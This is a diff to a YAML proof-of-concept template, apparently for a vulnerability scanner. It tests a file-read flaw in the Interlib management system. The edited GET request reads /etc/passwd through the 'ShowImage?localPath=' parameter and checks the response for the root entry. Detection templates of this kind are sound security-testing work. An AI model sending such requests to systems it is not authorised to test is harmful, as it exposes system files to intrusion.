@@ -2,7 +2,7 @@ name: poc-yaml-interlib-management-system-fileread
 groups:
   linux:
     - method: GET
-      path: /interlib/report/ShowImage?localPath=etc/passwd
+      path: /interlib/report/ShowImage?localPath=/etc/passwd
       expression: |
         response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
   windows:
